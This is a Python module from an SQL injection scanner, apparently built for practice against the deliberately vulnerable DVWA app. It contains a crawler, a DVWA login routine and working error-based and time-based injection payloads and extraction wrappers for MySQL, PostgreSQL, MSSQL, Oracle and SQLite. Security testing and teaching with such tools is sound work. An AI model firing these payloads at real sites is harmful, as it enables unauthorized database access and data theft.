#!/usr/bin/env python3
"""Core components: Config, Colors, helpers, HTTP client, crawler, contexts, signatures, Finding."""

import os, random, re, json, time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, unquote_plus
import requests
from bs4 import BeautifulSoup

# ─── Config ──────────────────────────────────────────────────
@dataclass
class Config:
    timeout:             int            = 20
    delay:               float          = 0.5
    max_depth:           int            = 2
    union_max_cols:      int            = 20
    similarity_threshold: float         = 0.90
    use_cookies:         bool           = True
    retries:             int            = 5
    time_delay:          int            = 5
    techniques:          List[str]      = field(default_factory=lambda: ["error","boolean","time","union"])
    forced_dbms:         Optional[str]  = None
    manual_column_count: Optional[int]  = None

# ─── Colors ──────────────────────────────────────────────────
class Colors:
    GREEN = "\033[92m"; YELLOW = "\033[93m"; RED = "\033[91m"
    BOLD_MAGENTA = "\033[1;95m"; CYAN = "\033[96m"; RESET = "\033[0m"

DEBUG = False

def info(m):  print(f"{Colors.GREEN}[*] {m}{Colors.RESET}")
def warn(m):  print(f"{Colors.YELLOW}[!] {m}{Colors.RESET}")
def error(m): print(f"{Colors.RED}[-] {m}{Colors.RESET}")
def good(m):  print(f"{Colors.BOLD_MAGENTA}[+] {m}{Colors.RESET}")
def diag(m):  print(f"{Colors.CYAN}[*] {m}{Colors.RESET}")
def debug(m):
    if DEBUG: print(f"{Colors.CYAN}[DEBUG]{Colors.RESET} {m}")

# ─── Helpers ─────────────────────────────────────────────────
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

def domain_folder(url: str) -> str:
    d = urlparse(url).netloc or url.replace("://","_")
    p = os.path.join(SCRIPT_DIR, d); os.makedirs(p, exist_ok=True); return p

def save_text(folder, name, lines):
    p = os.path.join(folder, name)
    with open(p,"w",encoding="utf-8") as f:
        for l in lines: f.write(l+"\n")
    info(f"Saved: {p}")

def save_json(folder, name, obj):
    p = os.path.join(folder, name)
    with open(p,"w",encoding="utf-8") as f: json.dump(obj, f, indent=2, ensure_ascii=False)
    info(f"Saved: {p}")

def same_domain(a, b): return urlparse(a).netloc == urlparse(b).netloc
def normalize_url(u):
    pr=urlparse(u); qs=parse_qs(pr.query, keep_blank_values=True)
    sq=urlencode({k: v[0] if v else "" for k,v in sorted(qs.items())})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, sq, ""))
def pretty_url(u): return unquote_plus(u)

def sanitize_html(html: str) -> str:
    """Strip dynamic content, HTML tags, and collapse whitespace."""
    if not html: return html
    html = re.sub(r"name='user_token'\s*value='[^']*'",
                  "name='user_token' value='REDACTED'", html)
    html = re.sub(r'name="user_token"\s*value="[^"]*"',
                  'name="user_token" value="REDACTED"', html)
    html = re.sub(r'name="csrf[^"]*"\s*value="[^"]*"',
                  'name="csrf" value="REDACTED"', html)
    html = re.sub(r"name='csrf[^']*'\s*value='[^']*'",
                  "name='csrf' value='REDACTED'", html)
    html = re.sub(r'\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2}', 'TIMESTAMP', html)
    html = re.sub(r'\b\d{10,13}\b', 'TSTAMPNUM', html)
    html = re.sub(r'\b[a-f0-9]{32}\b', 'HASH32', html)
    soup = BeautifulSoup(html, "html.parser")
    text = soup.get_text(separator=" ")
    text = re.sub(r'\s+', ' ', text).strip()
    return text

def apply_payload_to_url(url: str, param: str, payload: str, append: bool = True) -> str:
    pr = urlparse(url)
    qs = parse_qs(pr.query, keep_blank_values=True)
    if param in qs:
        cur = qs[param][0] if qs[param] else ""
        qs[param] = [(cur + payload) if append else payload]
    nq = urlencode({k: v[0] if v else "" for k,v in qs.items()})
    return urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, nq, ""))

def parse_techniques(tech_str: str) -> List[str]:
    SHORT = {'B':'boolean','E':'error','U':'union','T':'time'}
    VALID = {'boolean','error','union','time'}
    result = []
    for part in tech_str.split(','):
        part = part.strip()
        if not part: continue
        if part.lower() in VALID:
            result.append(part.lower())
        elif len(part)==1 and part.upper() in SHORT:
            result.append(SHORT[part.upper()])
        elif all(c.upper() in SHORT for c in part):
            for c in part: result.append(SHORT[c.upper()])
    seen=set(); out=[]
    for t in result:
        if t not in seen: seen.add(t); out.append(t)
    return out or list(VALID)

# ─── HTTP Client ─────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/117.0.2045.43",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0) AppleWebKit/605.1.15 Version/16.0 Safari/605.1.15",
]
DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
}

class HttpClient:
    def __init__(self, timeout=20, delay=0.5, use_cookies=True, retries=5):
        self.session = requests.Session()
        self.timeout = timeout
        self.delay = delay
        self.retries = retries
        if not use_cookies:
            self.session.cookies.clear()

    def login_dvwa(self, base_url, username="admin", password="password", security="low") -> bool:
        login_url    = f"{base_url.rstrip('/')}/login.php"
        security_url = f"{base_url.rstrip('/')}/security.php"
        self.session.headers.update({
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
            "DNT": "1", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1",
        })
        try:
            r = self.session.get(login_url, timeout=self.timeout)
            m = re.search(r"name='user_token' value='([^']+)'", r.text)
            tok = m.group(1) if m else ""
        except Exception as e:
            error(f"DVWA login page fetch failed: {e}"); return False
        data = {"username": username, "password": password, "Login": "Login", "user_token": tok}
        try:
            r = self.session.post(login_url, data=data, timeout=self.timeout, allow_redirects=True)
            if "login.php" in r.url.lower():
                warn("DVWA login failed — check credentials"); return False
        except Exception as e:
            error(f"DVWA login POST failed: {e}"); return False
        try:
            sr = self.session.get(security_url, timeout=self.timeout)
            m = re.search(r"name='user_token' value='([^']+)'", sr.text)
            tok = m.group(1) if m else ""
            self.session.post(security_url,
                data={"security": security, "seclev_submit": "Submit", "user_token": tok},
                timeout=self.timeout, allow_redirects=True)
            good(f"DVWA login successful, security set to '{security}'"); return True
        except Exception as e:
            error(f"DVWA security set failed: {e}"); return False

    def _do_get(self, url: str) -> Optional[requests.Response]:
        time.sleep(self.delay)
        hdrs = {**DEFAULT_HEADERS, "User-Agent": random.choice(USER_AGENTS)}
        resp = self.session.get(url, headers=hdrs, timeout=self.timeout, allow_redirects=True)
        debug(f"GET {resp.status_code} len={len(resp.text)} <- {pretty_url(url)}")
        resp.raise_for_status()
        return resp

    def get(self, url: str) -> Optional[requests.Response]:
        try:
            return self._do_get(url)
        except requests.exceptions.HTTPError as e:
            sc = e.response.status_code if e.response else 0
            if sc == 403: warn(f"403 Forbidden: {pretty_url(url)}")
            else:         error(f"HTTP {sc}: {pretty_url(url)}")
        except requests.exceptions.Timeout:
            error(f"Timeout: {pretty_url(url)}")
        except requests.exceptions.RequestException as e:
            error(f"Request error ({e}): {pretty_url(url)}")
        return None

    def get_with_retry(self, url: str, max_retries: Optional[int] = None) -> Optional[requests.Response]:
        n = max_retries if max_retries is not None else self.retries
        for attempt in range(n):
            try:
                return self._do_get(url)
            except requests.exceptions.HTTPError as e:
                sc = e.response.status_code if e.response else 0
                if sc in (403, 404, 410):
                    error(f"HTTP {sc} (no retry): {pretty_url(url)}"); return None
                error(f"HTTP {sc} (attempt {attempt+1}/{n}): {pretty_url(url)}")
            except requests.exceptions.Timeout:
                error(f"Timeout (attempt {attempt+1}/{n}): {pretty_url(url)}")
            except requests.exceptions.RequestException as e:
                error(f"Request failed (attempt {attempt+1}/{n}): {e}")
            if attempt < n-1:
                backoff = min(0.5 * (2**attempt), 8.0)
                debug(f"Backoff {backoff:.1f}s …")
                time.sleep(backoff)
        return None

    # ── Boolean response method — returns 404s instead of retrying ──
    def get_boolean_response(self, url: str) -> Optional[requests.Response]:
        """
        Get response for boolean SQLi testing.
        Returns response EVEN IF status is 404 (404 is meaningful for boolean detection).
        Only retries on actual connection failures, not on HTTP error status codes.
        """
        time.sleep(self.delay)
        hdrs = {**DEFAULT_HEADERS, "User-Agent": random.choice(USER_AGENTS)}
        debug(f"GET-Bool -> {pretty_url(url)}")

        for attempt in range(self.retries):
            try:
                resp = self.session.get(url, headers=hdrs, timeout=self.timeout, allow_redirects=True)
                debug(f"GET-Bool {resp.status_code} len={len(resp.text)} <- {pretty_url(url)}")
                # DON'T raise_for_status() — we want 404 responses!
                return resp
            except requests.exceptions.RequestException as e:
                error(f"Boolean request failed (attempt {attempt+1}/{self.retries}): {e}")
                if attempt < self.retries - 1:
                    backoff = min(0.5 * (2**attempt), 8.0)
                    time.sleep(backoff)
        return None

# ─── Crawler ──────────────────────────────────────────────────
@dataclass
class CrawlResult:
    url: str
    params: List[str] = field(default_factory=list)

class Crawler:
    def __init__(self, base_url: str, depth: int = 2, client: Optional[HttpClient] = None):
        self.base_url  = base_url.rstrip("/")
        self.depth     = max(1, depth)
        self.client    = client or HttpClient()
        self.visited: Set[str] = set()
        self.endpoints: Dict[str, Set[str]] = {}

    def run(self) -> List[CrawlResult]:
        info(f"Starting crawl on: {self.base_url}")
        self._crawl(self.base_url, self.depth)
        return [CrawlResult(u, sorted(list(ps))) for u,ps in self.endpoints.items()]

    def _crawl(self, url: str, depth: int) -> None:
        url = normalize_url(url)
        if depth <= 0 or url in self.visited: return
        self.visited.add(url)
        resp = self.client.get(url)
        if resp is None or "text/html" not in (resp.headers.get("Content-Type") or ""): return
        soup = BeautifulSoup(resp.text, "html.parser")
        pr = urlparse(url)
        if pr.query:
            ps = list(parse_qs(pr.query, keep_blank_values=True).keys())
            self.endpoints.setdefault(url, set()).update(ps)
            info(f"Found endpoint: {url} -> {ps}")
        for a in soup.find_all("a", href=True):
            nxt = urljoin(url, a["href"])
            if not same_domain(nxt, self.base_url): continue
            lp = urlparse(nxt)
            if lp.query:
                self.endpoints.setdefault(nxt, set()).update(
                    list(parse_qs(lp.query, keep_blank_values=True).keys()))
            self._crawl(nxt, depth-1)

# ─── Injection Contexts ──────────────────────────────────────
@dataclass
class InjectionContext:
    name: str
    close: str
    comment: str

INJECTION_CONTEXTS: List[InjectionContext] = [
    InjectionContext("numeric",      "",    "-- -"),
    InjectionContext("single",       "'",   "-- -"),
    InjectionContext("like-single",  "%'",  "-- -"),
    InjectionContext("double",       '"',   "-- -"),
    InjectionContext("like-double",  '%"',  "-- -"),
    InjectionContext("identifier",   "",    "-- -"),
]

def _ctx_by_close(close: str) -> InjectionContext:
    for c in INJECTION_CONTEXTS:
        if c.close == close: return c
    return INJECTION_CONTEXTS[0]

# ─── Signatures & Payloads ──────────────────────────────────
DBMS_SIGNATURES = {
    "MySQL":      ["you have an error in your sql syntax","warning: mysql","mysql_fetch",
                   "mysql_num_rows","mysqli","for the right syntax to use","mariadb"],
    "PostgreSQL": ["pg_query","pg_connect","postgresql","psql:","pg_exec"],
    "MSSQL":      ["microsoft odbc","sql server","oledbexception","mssql",
                   "unclosed quotation mark after the character string"],
    "Oracle":     ["ora-","oracle error","quoted string not properly terminated","pl/sql"],
    "SQLite":     ["sqlite error","sql logic error","sqlite3"],
}

SQL_ERROR_PATTERNS = [
    r"you have an error in your sql syntax", r"warning: mysql",
    r"mysql_fetch", r"mysql_num_rows", r"mysqli", r"for the right syntax to use",
    r"pg_query", r"pg_connect", r"postgresql",
    r"microsoft odbc", r"sql server", r"oledbexception",
    r"unclosed quotation mark", r"ora-\d+", r"oracle error",
    r"sqlite error", r"sql logic error",
    r"syntax error", r"unexpected token", r"unknown column",
    r"table.*doesn.t exist", r"division by zero",
    r"conversion failed", r"incorrect syntax", r"invalid parameter",
    r"cannot be cast", r"invalid input syntax",
    r"xpath syntax error", r"extractvalue\(", r"updatexml\(",
]

ERROR_BODIES: Dict[str, List[str]] = {
    "MySQL": [
        " AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))",
        " AND EXTRACTVALUE(1,CONCAT(0x7e,USER(),0x7e))",
        " AND UPDATEXML(1,CONCAT(0x2e,VERSION(),0x2e),1)",
        " AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x"
        " FROM information_schema.tables GROUP BY x)a)",
        " AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT 1),0x7e))",
    ],
    "PostgreSQL": [
        " AND CAST(version() AS INTEGER)",
        " AND 1=CAST(version() AS INTEGER)",
    ],
    "MSSQL": [
        " AND 1=CONVERT(INT,@@VERSION)",
        " AND 1=CONVERT(INT,(SELECT 'evilerr'))",
    ],
    "Oracle": [
        " AND (SELECT UTL_INADDR.GET_HOST_NAME(1) FROM dual) IS NOT NULL",
    ],
    "SQLite": [
        " AND abs(-9223372036854775808)",
        " AND LOAD_EXTENSION('fail')",
    ],
    "Generic": [
        "",
        " AND '1'='",
    ],
}

TIME_BODIES: Dict[str, List[str]] = {
    "MySQL":      [" AND SLEEP({delay})", " AND IF(1=1,SLEEP({delay}),0)"],
    "PostgreSQL": [" AND pg_sleep({delay}) IS NOT NULL"],
    "MSSQL":      ["; WAITFOR DELAY '0:0:{delay}'"],
    "Oracle":     [" AND (SELECT DBMS_LOCK.SLEEP({delay}) FROM dual) IS NOT NULL"],
    "SQLite":     [" AND (SELECT randomblob(100000000*{delay}))>0"],
    "Generic":    [" AND SLEEP({delay})", "; WAITFOR DELAY '0:0:{delay}'"],
}

TIME_EXTRACTION_WRAPPERS: Dict[str, str] = {
    "MySQL":      " AND IF(({condition}),SLEEP({delay}),0)",
    "PostgreSQL": " AND CASE WHEN ({condition}) THEN pg_sleep({delay}) ELSE NULL END IS NULL",
    "MSSQL":      "; IF ({condition}) WAITFOR DELAY '0:0:{delay}'",
    "Oracle":     " AND CASE WHEN ({condition}) THEN DBMS_LOCK.SLEEP({delay}) ELSE 1 END=1",
    "Generic":    " AND IF(({condition}),SLEEP({delay}),0)",
}

def detect_dbms(html_lower: str) -> Optional[str]:
    for db, sigs in DBMS_SIGNATURES.items():
        if any(s in html_lower for s in sigs): return db
    return None

# ── Boolean Hints ───────────────────────────────────────────
@dataclass
class BooleanHints:
    true_keywords:  List[str] = field(default_factory=list)
    false_keywords: List[str] = field(default_factory=list)
    auto_discover:  bool      = False

    @classmethod
    def from_url(cls, url: str) -> "BooleanHints":
        """Return hardcoded hints for known targets, empty otherwise."""
        u = url.lower()
        if "dvwa" in u and "sqli_blind" in u:
            return cls(
                true_keywords=["exists in the database"],
                false_keywords=["missing from the database"]
            )
        if "dvwa" in u and "sqli" in u:
            return cls(auto_discover=True)
        return cls(auto_discover=True)

    def learn(self, true_text: str, false_text: str) -> None:
        """Auto-extract keywords from two known responses."""
        def _words(text: str) -> Set[str]:
            return {w.lower() for w in re.findall(r"[a-zA-Z0-9]+", text) if len(w) >= 4}

        noise = {
            "user", "id", "the", "database", "welcome", "to", "dvwa",
            "login", "password", "username", "submit", "token", "csrf",
            "home", "about", "contact", "page", "html", "body", "div",
            "this", "that", "with", "from", "into", "your", "will",
            "have", "been", "were", "said", "each", "which", "their",
        }

        t_words = _words(true_text) - noise
        f_words = _words(false_text) - noise

        self.true_keywords  = sorted(t_words - f_words)
        self.false_keywords = sorted(f_words - t_words)
        self.auto_discover  = False

    def check(self, text: str) -> Optional[bool]:
        """Return True/False if keyword found, None otherwise."""
        text_lower = text.lower()
        for kw in self.true_keywords:
            if kw in text_lower:
                return True
        for kw in self.false_keywords:
            if kw in text_lower:
                return False
        return None

# ─── Finding ──────────────────────────────────────────────────
@dataclass
class Finding:
    url:          str
    param:        str
    technique:    str
    payload:      str
    context:      Optional[InjectionContext] = None
    dbms:         Optional[str]  = None
    severity:     str            = "Unknown"
    confidence:   float          = 0.0
    columns:      Optional[int]  = None
    version:      Optional[str]  = None
    current_user: Optional[str]  = None

    def to_dict(self):
        return {
            "url": self.url, "param": self.param,
            "technique": self.technique, "payload": self.payload,
            "context": self.context.name if self.context else None,
            "dbms": self.dbms, "severity": self.severity,
            "confidence": self.confidence, "columns": self.columns,
            "version": self.version, "current_user": self.current_user,
        }

    def summary(self) -> str:
        ctx = self.context.name if self.context else "n/a"
        return (f"{self.technique} | param={self.param} | ctx={ctx} | dbms={self.dbms or '?'}"
                f" | sev={self.severity} | conf={self.confidence:.2f} | cols={self.columns}"
                f" | ver={self.version or '-'} | user={self.current_user or '-'}")
